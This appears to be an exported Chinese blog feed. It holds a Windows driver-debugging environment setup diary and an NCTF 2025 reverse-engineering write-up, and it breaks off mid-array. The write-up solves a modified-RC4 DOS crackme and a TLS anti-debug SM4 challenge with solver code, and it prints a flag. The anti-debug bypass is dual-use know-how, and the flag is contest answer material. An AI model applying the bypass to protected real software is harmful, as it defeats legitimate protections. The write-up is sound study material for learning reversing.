那么还有一个注意的坑（我踩了），WDK是驱动开发的扩展，正确顺序是VS2019-&gt;WDK 但是我没注意反过来了，先安装的WDK，所以没有显示出驱动开发项目所以需要重新安装，我这里第一次尝试点击修复，等待会好了看看可不可以。。。驱动开发好多坑啊 123456789#include&lt;ntifs.h&gt;VOID DriverUnload(PDRIVER_OBJECT pDriver) &#123;&#125;NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pPeg) &#123; pDriver-&gt;DriverUnload = DriverUnload; return STATUS_SUCCESS;&#125; 第一个测试程序，这个程序是用来查看你的SDK和WDK的区别的 报错：严重性 代码 说明 项目 文件 行 禁止显示状态 错误 MSB8040 此项目需要缓解了 Spectre 漏洞的库。从 Visual Studio 安装程序(单个组件选项卡)为正在使用的任何工具集和体系结构安装它们。了解详细信息: https://aka.ms/Ofhn4c MyDriver2 C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\MSBuild\\Microsoft\\VC\\v160\\Microsoft.CppBuild.targets 486 解决文章：https://blog.csdn.net/wangzhichunnihao/article/details/108584295 网盘课程中接下来才说要用到虚拟机win7，他推荐使用Homebasic家庭版 将win7x86先下载下来然后直接默认配置，出现第一个问题，vmtools安装不了https://blog.csdn.net/teisite/article/details/117675403，这个文章说了办法，这里需要补充 1.3CDaemonhttps://blog.csdn.net/NeverGUM/article/details/101535864 2.3CDaemon汉化地址GitCode - 全球开发者的开源社区,开源代码托管平台 3.SHA2算法升级https://www.catalog.update.microsoft.com/Search.aspx?q=kb4474419 3CDaemon 第二个是自己的端口号，需要下载本机上文件的需要以下指令 123ftp &lt;ip端口号&gt;用户名密码 然后相当于连接上了本机，此时本机的设置的那个文件夹就相当于服务器了 接着用命令get xxx，来获取xxx 。。。。这里我踩了个巨坑 镜像选下面这个，sp1才支持SHA1算法升级到SHA2，然后才可以安装VMtools 好好好这是第二个废系统了，那么接下来就是win7x86sp1-&gt;SHA2.msu-&gt;移除软盘-&gt;setup 发现迅雷一个毛病，下载到99.99%就直接卡住，我重启试试 eMule。。。我真无语了，迅雷就是下不好，两天了，最后0.01%还没下好，无奈只能换一个工具，最近感觉把能踩的坑都踩了，emule和迅雷一样是用于下载的？ 官网：https://www.emule-project.com/home/perl/general.cgi?l=42&rm=download 先更新下载源http://upd.emule-security.org/nodes.dat 然后直接在下载界面复制即可（不过下载速度慢的捉急） 迅雷最后我发现，先转存网盘（迅雷网盘）然后下载网盘内容，就不会卡死了 至此我的win7x64x32就搞定了 调试模式小tips：右键cmd，点标记就可以复制了 123456789101112131415161718192021222324252627bcdeditbcdedit /copy &#123;current&#125; /d debugbcdedit /displayorder &#123;fbf1106f-022c-11f0-a466-ab0d31d72b23&#125; /addlastbcdedit /dbgsettings SERIAL DEBUGPORT:1 BAUDRATE:115200 bcdedit /bootdebug &#123;fbf1106f-022c-11f0-a466-ab0d31d72b23&#125; ONbcdedit /debug &#123;fbf1106f-022c-11f0-a466-ab0d31d72b23&#125; ONbcdedit /timeout 30090f876d-0a19-11eb-91ce-f2d2a66b6220//虚拟机配置&quot;C:\\Program Files (x86)\\Windows Kits\\8.1\\Debuggers\\x86\\windbg.exe&quot; -y SRV*E:\\symbol*http://msdl.microsoft.com/download/symbols -b -k com:port=//./pipe/com_1,baud=115200,pipe环境变量配置_NT_SYMBOL_PATHSRV*E:\\symbol* https://msdl.microsoft.com/download/symbols 添加串行端口https://blog.csdn.net/qq_33406883&#x2F;article&#x2F;details&#x2F;106549466 这里两个注意，1.E:\\symbol这个是用来放下载标识符的 2.&#x2F;&#x2F;.&#x2F;pipe&#x2F;com_1，这个要和串行端口使用的管道名字一致 串行端口导致win786虚拟机开机黑屏。。。并不是而是第一次启动的时候windbg int 3 暂停了，继续的指令是g VS2008VS2008下载和安装图文教程 至此环境配置结束 网络本来结束了，后面才想起来网络还没有配置好，那么网上的文章教程主要集中于 服务里面的VM DHCP NAT开没开，是不是net方式连接，桥接的话网卡选没选对等等等 但是以上的问题我都是没有的，甚至于我ping的通主机和www.baidu.com，最终终于找到了一篇很合适的文章[主机和虚拟机可以互ping但虚拟机不能上网_虚拟机能ping通主机,但无法上网-CSDN博客](https://blog.csdn.net/Y5823990/article/details/115047879) 是的，问题所在是DNS服务器的端口和虚拟机中配置不同，问题就在于之前你的虚拟机练过别的地方的网络那么接下来你的网络DNS端口会自动保存上次的，以至于端口不对自然没有网络 所以要做的就是将DNS端口换成当前主机连接网络的DNS端口号，linux系统不必多言里面有 windows系统则是打开控制面板-&gt;网络和Internet-&gt;网络和共享中心-&gt;更改适配器设置 参考文章（找不到了。。。哦有可能是gpt）","updated":"2025-10-08T09:42:42.278Z","categories":[{"name":"逆向行驶","slug":"逆向行驶","permalink":"https://l1pmoluy.github.io/categories/%E9%80%86%E5%90%91%E8%A1%8C%E9%A9%B6/"}],"tags":[{"name":"windows深度学习","slug":"windows深度学习","permalink":"https://l1pmoluy.github.io/tags/windows%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"}]},{"title":"nctf2025-re-wp","date":"2025-03-26T09:35:14.000Z","path":"2025/03/26/2025nctf/","text":"写了逆向方向3个题，队伍第12 ezDos好像只能汇编分析 12345678910111213141516171819202122232425262728293031323334seg002:0000 seg002 segment byte public &#x27;CODE&#x27; use16seg002:0000 assume cs:seg002seg002:0000 assume es:nothing, ss:seg001, ds:nothing, fs:nothing, gs:nothingseg002:0000seg002:0000 public startseg002:0000 start:seg002:0000 mov ax, seg dsegseg002:0003 mov ds, axseg002:0005 assume ds:dsegseg002:0005 mov es, axseg002:0007 assume es:dsegseg002:0007 xor ax, axseg002:0009 test ax, axseg002:000B jnz short loc_104BFseg002:000D jz short loc_104C0seg002:000Fseg002:000F loc_104BF: ; CODE XREF: seg002:000B↑jseg002:000F nopseg002:0010seg002:0010 loc_104C0: ; CODE XREF: seg002:000D↑jseg002:0010 mov ah, 9seg002:0012 lea dx, aShowMeYourFlag ; &quot;\\r\\nShow me your flag: $\\r\\nCongradulat&quot;...seg002:0016 int 21h ; DOS - PRINT STRINGseg002:0016 ; DS:DX -&gt; string terminated by &quot;$&quot;seg002:0018 mov ah, 0Ahseg002:001A lea dx, unk_10168seg002:001E int 21h ; DOS - BUFFERED KEYBOARD INPUTseg002:001E ; DS:DX -&gt; bufferseg002:0020 call sub_10630seg002:0025 lea bx, unk_10168seg002:0029 inc bxseg002:002A cmp byte ptr [bx], 26h ; &#x27;&amp;&#x27;seg002:002D jz short loc_104E2seg002:002F jmp loc_105B7 这部分是将输入放在168的位置，并且168里放的是大小，要比对大小是0x26 12345678910111213141516171819202122seg002:0032 ; ---------------------------------------------------------------------------seg002:0032seg002:0032 loc_104E2: ; CODE XREF: seg002:002D↑jseg002:0032 xor si, siseg002:0034 xor di, diseg002:0036 xor cx, cxseg002:0038 mov cx, 100hseg002:003Bseg002:003B loc_104EB: ; CODE XREF: seg002:003D↓jseg002:003B push diseg002:003C inc diseg002:003D loop loc_104EBseg002:003Fseg002:003F loc_104EF: ; CODE XREF: seg002:0052↓jseg002:003F pop bxseg002:0040 call sub_10670seg002:0045 mov bx, siseg002:0047 mov [si+0], blseg002:004B inc siseg002:004C cmp si, 100hseg002:0050 jnb short loc_10504seg002:0052 jmp short loc_104EF 本题第一个坑，rc4的init阶段，刚开始有一个push 0x100次压栈，但乍一看后面好像并没有用到但是我们去关注sub_10670函数本身 123456789101112131415161718192021seg005:0000 sub_10670 proc far ; CODE XREF: seg002:0040↑Pseg005:0000 pop dxseg005:0001 push axseg005:0002 xor ax, axseg005:0004 mov ax, 0Fhseg005:0007 and ax, 7seg005:000A shl ax, 1seg005:000C shl ax, 1seg005:000E mov ah, 1Ahseg005:0010 not ahseg005:0012 shr ah, 1seg005:0014 shr ah, 1seg005:0016 xor al, ahseg005:0018 sub ah, 1Ehseg005:001B and al, ahseg005:001D inc alseg005:001F add dl, alseg005:0021 pop axseg005:0022 push dxseg005:0023 retfseg005:0023 sub_10670 endp ret&#x3D;pop jmp，所以最后push进去的就会是跳转，刚开始pop dx，返回地址被取出，add dl,al，这里对返回地址改动，这个数字是固定的，经过计算这里的al是2，所以call sub_10670后紧跟的两字节是被越过的 所以再次观察就会发现，bl里的值就是先前压栈的值，并且栈是先进后出，所以这里rc4init是反着来的盒，所以第一部分造盒 12345678910111213141516void rc4init1() &#123; unsigned char a = 0xff; for (int i = 0; i &lt; 256; i++) &#123; box[i] = a; a--; &#125; for (int i = 0; i &lt; 0x10; i++) &#123; for (int j = 0; j &lt; 0x10; j++) &#123; printf(&quot;%02x &quot;, box[j + i * 0x10]); &#125; printf(&quot;\\n&quot;); &#125;&#125; 紧接着往后看 12345678910111213141516171819202122232425262728293031323334353637383940414243444546seg002:0054 loc_10504: ; CODE XREF: seg002:0050↑jseg002:0054 xor si, siseg002:0056 xor di, diseg002:0058 mov bx, 134hseg002:005B mov cl, [bx]seg002:005Dseg002:005D loc_1050D: ; CODE XREF: seg002:00B9↓jseg002:005D mov dl, [si+0]seg002:0061 add di, dxseg002:0063 mov ax, siseg002:0065 div clseg002:0067 mov al, ahseg002:0069 xor ah, ahseg002:006B mov bx, 135hseg002:006E add bx, axseg002:0070 mov al, [bx]seg002:0072 push axseg002:0073 call jmp_$6seg002:0078 shl ax, 1seg002:007A shl ax, 1seg002:007C shl ax, 1seg002:007E shl ax, 1seg002:0080 shl ax, 1seg002:0082 shl ax, 1seg002:0084 mov dx, axseg002:0086 pop axseg002:0087 push dxseg002:0088 call jmp_$2seg002:008D shr ax, 1seg002:008F shr ax, 1seg002:0091 shr ax, 1seg002:0093 shr ax, 1seg002:0095 shr ax, 1seg002:0097 shr ax, 1seg002:0099 pop dxseg002:009A or al, dlseg002:009C add di, axseg002:009E and di, 0FFhseg002:00A2 mov al, [si+0]seg002:00A6 mov dl, [di+0]seg002:00AA xchg al, dlseg002:00AC mov [di+0], dlseg002:00B0 mov [si+0], alseg002:00B4 inc siseg002:00B5 cmp si, 100hseg002:00B9 jb short loc_1050D 于是就该换盒了，si&#x3D;i,di&#x3D;j，慢慢看，134里面存储的是0xc，后面紧跟着是’NCTf2024nctF’，刚好12字节大小，并且0xc给了cl，[+0]代表的是前面造的盒 一开始是 dl&#x3D;S[i]; j&#x3D;j+dl; al&#x3D;key[i%0xc]; 后面紧跟着的push ax是为了把前面左移和后面右移区分，同时这两个函数也和前面一样是用来改变返回地址的，所以这里实现的是： push ax; shl ax,3; mov dx,ax; pop ax; push dx; shr ax,5; pop dx; or al,dl: add di,ax; 也就相当于(a&lt;&lt;3)|(a&gt;&gt;5)，最后j+&#x3D;a; j%256; change(S[i],S[j]); 123456789101112131415161718192021222324252627282930313233343536seg002:00BB xor cx, cxseg002:00BD mov bx, 169hseg002:00C0 mov cl, [bx]seg002:00C2 inc bxseg002:00C3 mov si, bxseg002:00C5 xor bx, bxseg002:00C7 xor dx, dxseg002:00C9 xor ax, axseg002:00CB test ax, axseg002:00CD jnz short loc_10581seg002:00CF jz short loc_10582seg002:00D1seg002:00D1 loc_10581: ; CODE XREF: seg002:00CD↑jseg002:00D1 nopseg002:00D2seg002:00D2 loc_10582: ; CODE XREF: seg002:00CF↑jseg002:00D2 ; seg002:00FE↓jseg002:00D2 inc blseg002:00D4 mov al, [bx+0]seg002:00D8 add dl, alseg002:00DA push dxseg002:00DB mov di, dxseg002:00DD mov al, [bx+0]seg002:00E1 xchg al, [di+0]seg002:00E5 mov [bx+0], alseg002:00E9 add al, [di+0]seg002:00ED mov di, axseg002:00EF mov al, [di+0]seg002:00F3 call jmp_$1seg002:00F8 inc axseg002:00F9 inc axseg002:00FA xor [si], alseg002:00FC pop dxseg002:00FD inc siseg002:00FE loop loc_10582seg002:0100 jmp short loc_105C1 最后一段，怎么说呢，复杂归复杂，慢慢捋出来把，其实就是rc4稍微变了一下。。。服了卡了一天 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdint.h&gt;#include&lt;stdlib.h&gt;unsigned char box[256] = &#123; 0 &#125;;void rc4init1() &#123; unsigned char a = 0xff; for (int i = 0; i &lt; 256; i++) &#123; box[i] = a; a--; &#125; for (int i = 0; i &lt; 0x10; i++) &#123; for (int j = 0; j &lt; 0x10; j++) &#123; printf(&quot;%02x &quot;, box[j + i * 0x10]); &#125; printf(&quot;\\n&quot;); &#125;&#125;void rc4init2(unsigned char* key) &#123; int i, j; i = 0; j = 0; unsigned char high; unsigned char low; unsigned char mi; for ( i = 0; i &lt; 0x100; i++) &#123; j = box[i] + j; high = key[i % 0xc]; low = high; mi = ((high &lt;&lt; 3) &amp; 0xff) | ((low &gt;&gt; 5) &amp; 0xff); j = (j + mi) % 256; mi = box[i]; box[i] = box[j]; box[j] = mi; &#125; printf(&quot;\\n&quot;); for (int i = 0; i &lt; 0x10; i++) &#123; for (int j = 0; j &lt; 0x10; j++) &#123; printf(&quot;%02x &quot;, box[j + i * 0x10]); &#125; printf(&quot;\\n&quot;); &#125;&#125;void rc4(unsigned char* flag) &#123; unsigned char i = 0; unsigned char j = 0; unsigned char mi; unsigned char t; for (int q = 0; q &lt; strlen(flag); q++) &#123; i++; j = (j + box[i]) % 256; mi = box[j]; box[j] = box[i]; box[i] = mi; t = (box[i] + box[j]) % 256; t = box[t]; t++; flag[q] ^= t; printf(&quot;%c&quot;, flag[q]); &#125;&#125;int main() &#123; unsigned char key[] = &quot;NCTf2024nctF&quot;; unsigned char flag[] = &#123; 0x7C, 0x3E, 0x0D, 0x3C, 0x88, 0x54, 0x83, 0x0E, 0x3B, 0xB8, 0x99, 0x1B, 0x9B, 0xE5, 0x23, 0x43, 0xC5, 0x80, 0x45, 0x5B, 0x9A, 0x29, 0x24, 0x38, 0xA9, 0x5C, 0xCB, 0x7A, 0xE5, 0x93, 0x73, 0x0E, 0x70, 0x6D, 0x7C, 0x31, 0x2B, 0x8C, 0 &#125;; rc4init1(); rc4init2(key); rc4(flag); //NCTF&#123;Y0u_4r3_Assemb1y_M4st3r_5d0b497e&#125; return;&#125; SafeProgram拖进去 12345678910111213141516171819202122232425262728293031323334353637383940int __fastcall main(int argc, const char **argv, const char **envp)&#123; _BYTE v4[24]; // [rsp+38h] [rbp-70h] BYREF _BYTE Buf1[16]; // [rsp+50h] [rbp-58h] BYREF _BYTE Buf1_1[48]; // [rsp+60h] [rbp-48h] BYREF sub_7FF6E42D15F0(argc, argv, envp); memset(Str1, 0, sizeof(Str1)); memset(byte_7FF6E42FC380, 0, sizeof(byte_7FF6E42FC380)); memset(v4, 0, 0x14uLL); sub_7FF6E42D1830(aWelcomeToNctf); // &quot;Welcome to NCTF\\n&quot; Sleep(0x1F4u); sub_7FF6E42D1830(aEnterYourFlag); // &quot;Enter your flag &quot; Sleep(0x1F4u); sub_7FF6E42D1830(aAndHaveAGoodTi); // &quot;And have a good time: &quot; sub_7FF6E42D18B0(&quot;%64s&quot;, Str1); if ( strlen(Str1) != 38 ) &#123; sub_7FF6E42D1830(aLengthError); // &quot;Length Error!&quot; ExitProcess(1u); &#125; if ( !strncmp( Str1, Str2, // &quot;NCTF&#123;&quot; 5uLL) &amp;&amp; Str1[37] == 125 ) &#123; sub_7FF6E42D1E10(Str1, &quot;NCTF&#123;%32s&#125;&quot;, byte_7FF6E42FC380); memcpy(v4, &amp;aNctf24nctf, 0xAuLL); memcpy(&amp;v4[10], &amp;aNctf24nctf, 6uLL); sub_7FF6E42D19D0(byte_7FF6E42FC380, v4, Buf1); sub_7FF6E42D19D0(&amp;byte_7FF6E42FC380[16], v4, Buf1_1); &#125; if ( memcmp(Buf1, &amp;Buf2_, 0x20uLL) ) &#123; sub_7FF6E42D1830(aWrongFlag); // &quot;Wrong Flag!&quot; ExitProcess(1u); &#125; sub_7FF6E42D1830(aCorrect); // &quot;Correct!&quot; return 0;&#125; 题目提示说调试器在监视你，果然调试的时候闪退了，往start方向找下断点发现毫无作用，那看来是init或者tls的原因，看导出表发现果然有两个tls，第一个里面看不出是做什么的 12345void sub_140001520()&#123; if ( !(unsigned int)sub_1400011D0() ) RaiseException(0xE0000001, 0, 0, 0LL);&#125; 顺着找很快就看到了，这里把逻辑改一下然后保存一下，就可以调试了，整体逻辑不难，就是sm4加密，当然如果没见过还是很难的，不过直接解密发现有问题，应该是sm4有改动，加密逻辑不好改的话那就只能是1.盒2.轮遍数，后面发现是Sbox变动了，是因为我发现key变了，看交叉引用发现是tls0里面的东西。。。前面说的话打脸了 123456789101112131415161718__int64 sub_7FF677251480()&#123; __int64 result; // rax int i; // [rsp+20h] [rbp-18h] int j; // [rsp+24h] [rbp-14h] for ( i = 0; i &lt; 10; ++i ) &#123; byte_7FF67727A0C0[i] ^= 0x91u; result = (unsigned int)(i + 1); &#125; for ( j = 0; j &lt; 10; ++j ) &#123; sub_7FF677251E80(byte_7FF67727A0D0, &amp;byte_7FF67727A0D0[byte_7FF67727A0C0[j]]); result = (unsigned int)(j + 1); &#125; return result;&#125; 后面的就是盒，前面的是key，再次解密就出flag了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261#define _SM4_H_#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#define u8 unsigned char#define u32 unsigned longvoid four_uCh2uLong(u8* in, u32* out); //四字节转换成u32void uLong2four_uCh(u32 in, u8* out); //u32转换成四字节unsigned long move(u32 data, int length); //左移，保留丢弃位放置尾部unsigned long func_key(u32 input); //先使用Sbox进行非线性变化，再将线性变换L置换为L&#x27;unsigned long func_data(u32 input); //先使用Sbox进行非线性变化，再进行线性变换Lvoid print_hex(u8* data, int len); //无符号字符数组转16进制打印void encode_fun(u8 len, u8* key, u8* input, u8* output); //加密函数void decode_fun(u8 len, u8* key, u8* input, u8* output); //解密函数/******************************定义系统参数FK的取值****************************************/const u32 TBL_SYS_PARAMS[4] = &#123;0xa3b1bac6,0x56aa3350,0x677d9197,0xb27022dc&#125;;/******************************定义固定参数CK的取值****************************************/const u32 TBL_FIX_PARAMS[32] = &#123;0x00070e15,0x1c232a31,0x383f464d,0x545b6269,0x70777e85,0x8c939aa1,0xa8afb6bd,0xc4cbd2d9,0xe0e7eef5,0xfc030a11,0x181f262d,0x343b4249,0x50575e65,0x6c737a81,0x888f969d,0xa4abb2b9,0xc0c7ced5,0xdce3eaf1,0xf8ff060d,0x141b2229,0x30373e45,0x4c535a61,0x686f767d,0x848b9299,0xa0a7aeb5,0xbcc3cad1,0xd8dfe6ed,0xf4fb0209,0x10171e25,0x2c333a41,0x484f565d,0x646b7279&#125;;/******************************SBox参数列表****************************************/const u8 TBL_SBOX[256] = &#123; 0xD1, 0x90, 0xE9, 0xFE, 0xCC, 0xE1, 0x3D, 0xB7, 0x16, 0xB6, 0x14, 0xC2, 0x28, 0xFB, 0x2C, 0x05, 0x2B, 0x67, 0x9A, 0x76, 0x2A, 0xBE, 0x04, 0xC3, 0xAA, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99, 0x9C, 0x42, 0x50, 0xF4, 0x91, 0xEF, 0x98, 0x7A, 0x33, 0x54, 0x0B, 0x43, 0xED, 0xCF, 0xAC, 0x62, 0xE4, 0xB3, 0x17, 0xA9, 0x1C, 0x08, 0xE8, 0x95, 0x80, 0xDF, 0x94, 0xFA, 0x75, 0x8F, 0x3F, 0xA6, 0x47, 0x07, 0xA7, 0x4F, 0xF3, 0x73, 0x71, 0xBA, 0x83, 0x59, 0x3C, 0x19, 0xE6, 0x85, 0xD6, 0xA8, 0x68, 0x6B, 0x81, 0xB2, 0xFC, 0x64, 0xDA, 0x8B, 0xF8, 0xEB, 0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35, 0x1E, 0x24, 0x0E, 0x78, 0x63, 0x58, 0x9F, 0xA2, 0x25, 0x22, 0x7C, 0x3B, 0x01, 0x21, 0xC9, 0x87, 0xD4, 0x00, 0x46, 0x57, 0x5E, 0xD3, 0x27, 0x52, 0x4C, 0x36, 0x02, 0xE7, 0xA0, 0xC4, 0xC8, 0x9E, 0xEA, 0xBF, 0x8A, 0xD2, 0x40, 0xC7, 0x38, 0xB5, 0xA3, 0xF7, 0xF2, 0xCE, 0xF9, 0x61, 0x15, 0xA1, 0xE0, 0xAE, 0x5D, 0xA4, 0x9B, 0x34, 0x1A, 0x55, 0xAD, 0x93, 0x32, 0x30, 0xF5, 0x8C, 0xB1, 0xE3, 0x1D, 0xF6, 0xE2, 0x2E, 0x82, 0x66, 0xCA, 0x60, 0xC0, 0x29, 0x23, 0xAB, 0x0D, 0x53, 0x4E, 0x6F, 0xD5, 0xDB, 0x37, 0x45, 0xDE, 0xFD, 0x8E, 0x2F, 0x03, 0xFF, 0x6A, 0x72, 0x6D, 0x6C, 0x5B, 0x51, 0x8D, 0x1B, 0xAF, 0x92, 0xBB, 0xDD, 0xBC, 0x7F, 0x11, 0xD9, 0x5C, 0x41, 0x1F, 0x10, 0x5A, 0xD8, 0x0A, 0xC1, 0x31, 0x88, 0xA5, 0xCD, 0x7B, 0xBD, 0x2D, 0x74, 0xD0, 0x12, 0xB8, 0xE5, 0xB4, 0xB0, 0x89, 0x69, 0x97, 0x4A, 0x0C, 0x96, 0x77, 0x7E, 0x65, 0xB9, 0xF1, 0x09, 0xC5, 0x6E, 0xC6, 0x84, 0x18, 0xF0, 0x7D, 0xEC, 0x3A, 0xDC, 0x4D, 0x20, 0x79, 0xEE, 0x5F, 0x3E, 0xD7, 0xCB, 0x39, 0x48&#125;;//4字节无符号数组转无符号long型void four_uCh2uLong(u8* in, u32* out)&#123; int i = 0; *out = 0; for (i = 0; i &lt; 4; i++) *out = ((u32)in[i] &lt;&lt; (24 - i * 8)) ^ *out;&#125;//无符号long型转4字节无符号数组void uLong2four_uCh(u32 in, u8* out)&#123; int i = 0; //从32位unsigned long的高位开始取 for (i = 0; i &lt; 4; i++) *(out + i) = (u32)(in &gt;&gt; (24 - i * 8));&#125;//左移，保留丢弃位放置尾部u32 move(u32 data, int length)&#123; u32 result = 0; result = (data &lt;&lt; length) ^ (data &gt;&gt; (32 - length)); return result;&#125;//秘钥处理函数,先使用Sbox进行非线性变化，再将线性变换L置换为L&#x27;u32 func_key(u32 input)&#123; int i = 0; u32 ulTmp = 0; u8 ucIndexList[4] = &#123; 0 &#125;; u8 ucSboxValueList[4] = &#123; 0 &#125;; uLong2four_uCh(input, ucIndexList); for (i = 0; i &lt; 4; i++) &#123; ucSboxValueList[i] = TBL_SBOX[ucIndexList[i]]; &#125; four_uCh2uLong(ucSboxValueList, &amp;ulTmp); ulTmp = ulTmp ^ move(ulTmp, 13) ^ move(ulTmp, 23); return ulTmp;&#125;//加解密数据处理函数,先使用Sbox进行非线性变化，再进行线性变换Lu32 func_data(u32 input)&#123; int i = 0; u32 ulTmp = 0; u8 ucIndexList[4] = &#123; 0 &#125;; u8 ucSboxValueList[4] = &#123; 0 &#125;; uLong2four_uCh(input, ucIndexList); for (i = 0; i &lt; 4; i++) &#123; ucSboxValueList[i] = TBL_SBOX[ucIndexList[i]]; &#125; four_uCh2uLong(ucSboxValueList, &amp;ulTmp); ulTmp = ulTmp ^ move(ulTmp, 2) ^ move(ulTmp, 10) ^ move(ulTmp, 18) ^ move(ulTmp, 24); return ulTmp;&#125;//加密函数（可以加密任意长度数据，16字节为一次循环，不足部分补0凑齐16字节的整数倍）//len:数据长度(任意长度数据) key:密钥（16字节） input:输入的原始数据 output:加密后输出数据void encode_fun(u8 len, u8* key, u8* input, u8* output)&#123; int i = 0, j = 0; u8* p = (u8*)malloc(50); //定义一个50字节缓存区 u32 ulKeyTmpList[4] = &#123; 0 &#125;; //存储密钥的u32数据 u32 ulKeyList[36] = &#123; 0 &#125;; //用于密钥扩展算法与系统参数FK运算后的结果存储 u32 ulDataList[36] = &#123; 0 &#125;; //用于存放加密数据 /***************************开始生成子秘钥********************************************/ four_uCh2uLong(key, &amp;(ulKeyTmpList[0])); four_uCh2uLong(key + 4, &amp;(ulKeyTmpList[1])); four_uCh2uLong(key + 8, &amp;(ulKeyTmpList[2])); four_uCh2uLong(key + 12, &amp;(ulKeyTmpList[3])); ulKeyList[0] = ulKeyTmpList[0] ^ TBL_SYS_PARAMS[0]; ulKeyList[1] = ulKeyTmpList[1] ^ TBL_SYS_PARAMS[1]; ulKeyList[2] = ulKeyTmpList[2] ^ TBL_SYS_PARAMS[2]; ulKeyList[3] = ulKeyTmpList[3] ^ TBL_SYS_PARAMS[3]; for (i = 0; i &lt; 32; i++) //32次循环迭代运算 &#123; //5-36为32个子秘钥 ulKeyList[i + 4] = ulKeyList[i] ^ func_key(ulKeyList[i + 1] ^ ulKeyList[i + 2] ^ ulKeyList[i + 3] ^ TBL_FIX_PARAMS[i]); &#125; /***********************************生成32轮32位长子秘钥结束**********************************/ for (i = 0; i &lt; len; i++) //将输入数据存放在p缓存区 *(p + i) = *(input + i); for (i = 0; i &lt; 16 - len % 16; i++)//将不足16位补0凑齐16的整数倍 *(p + len + i) = 0; for (j = 0; j &lt; len / 16 + ((len % 16) ? 1 : 0); j++) //进行循环加密,并将加密后数据保存（可以看出此处是以16字节为一次加密，进行循环，即若16字节则进行一次，17字节补0至32字节后进行加密两次，以此类推） &#123; /*开始处理加密数据*/ four_uCh2uLong(p + 16 * j, &amp;(ulDataList[0])); four_uCh2uLong(p + 16 * j + 4, &amp;(ulDataList[1])); four_uCh2uLong(p + 16 * j + 8, &amp;(ulDataList[2])); four_uCh2uLong(p + 16 * j + 12, &amp;(ulDataList[3])); //加密 for (i = 0; i &lt; 32; i++) &#123; ulDataList[i + 4] = ulDataList[i] ^ func_data(ulDataList[i + 1] ^ ulDataList[i + 2] ^ ulDataList[i + 3] ^ ulKeyList[i + 4]); &#125; /*将加密后数据输出*/ uLong2four_uCh(ulDataList[35], output + 16 * j); uLong2four_uCh(ulDataList[34], output + 16 * j + 4); uLong2four_uCh(ulDataList[33], output + 16 * j + 8); uLong2four_uCh(ulDataList[32], output + 16 * j + 12); &#125; free(p);&#125;//解密函数（与加密函数基本一致，只是秘钥使用的顺序不同，即把钥匙反着用就是解密）//len:数据长度 key:密钥 input:输入的加密后数据 output:输出的解密后数据void decode_fun(u8 len, u8* key, u8* input, u8* output)&#123; int i = 0, j = 0; u32 ulKeyTmpList[4] = &#123; 0 &#125;;//存储密钥的u32数据 u32 ulKeyList[36] = &#123; 0 &#125;; //用于密钥扩展算法与系统参数FK运算后的结果存储 u32 ulDataList[36] = &#123; 0 &#125;; //用于存放加密数据 /*开始生成子秘钥*/ four_uCh2uLong(key, &amp;(ulKeyTmpList[0])); four_uCh2uLong(key + 4, &amp;(ulKeyTmpList[1])); four_uCh2uLong(key + 8, &amp;(ulKeyTmpList[2])); four_uCh2uLong(key + 12, &amp;(ulKeyTmpList[3])); ulKeyList[0] = ulKeyTmpList[0] ^ TBL_SYS_PARAMS[0]; ulKeyList[1] = ulKeyTmpList[1] ^ TBL_SYS_PARAMS[1]; ulKeyList[2] = ulKeyTmpList[2] ^ TBL_SYS_PARAMS[2]; ulKeyList[3] = ulKeyTmpList[3] ^ TBL_SYS_PARAMS[3]; for (i = 0; i &lt; 32; i++) //32次循环迭代运算 &#123; //5-36为32个子秘钥 ulKeyList[i + 4] = ulKeyList[i] ^ func_key(ulKeyList[i + 1] ^ ulKeyList[i + 2] ^ ulKeyList[i + 3] ^ TBL_FIX_PARAMS[i]); &#125; /*生成32轮32位长子秘钥结束*/ for (j = 0; j &lt; len / 16; j++) //进行循环加密,并将加密后数据保存 &#123; /*开始处理解密数据*/ four_uCh2uLong(input + 16 * j, &amp;(ulDataList[0])); four_uCh2uLong(input + 16 * j + 4, &amp;(ulDataList[1])); four_uCh2uLong(input + 16 * j + 8, &amp;(ulDataList[2])); four_uCh2uLong(input + 16 * j + 12, &amp;(ulDataList[3])); //解密 for (i = 0; i &lt; 32; i++) &#123; ulDataList[i + 4] = ulDataList[i] ^ func_data(ulDataList[i + 1] ^ ulDataList[i + 2] ^ ulDataList[i + 3] ^ ulKeyList[35 - i]);//与加密唯一不同的就是轮密钥的使用顺序 &#125; /*将解密后数据输出*/ uLong2four_uCh(ulDataList[35], output + 16 * j); uLong2four_uCh(ulDataList[34], output + 16 * j + 4); uLong2four_uCh(ulDataList[33], output + 16 * j + 8); uLong2four_uCh(ulDataList[32], output + 16 * j + 12); &#125;&#125;//无符号字符数组转16进制打印void print_hex(u8* data, int len)&#123; int i = 0; char alTmp[16] = &#123; &#x27;0&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;e&#x27;,&#x27;f&#x27; &#125;; for (i = 0; i &lt; len; i++) &#123; printf(&quot;%c&quot;, alTmp[data[i] / 16]); printf(&quot;%c&quot;, alTmp[data[i] % 16]); putchar(&#x27; &#x27;); &#125; putchar(&#x27;\\n&#x27;);&#125;int main(void)&#123; u8 i, len; u8 encode_Result[] = &#123; 0xFB, 0x97, 0x3C, 0x3B, 0xF1, 0x99, 0x12, 0xDF, 0x13, 0x30, 0xF7, 0xD8, 0x7F, 0xEB, 0xA0, 0x6C, 0x14, 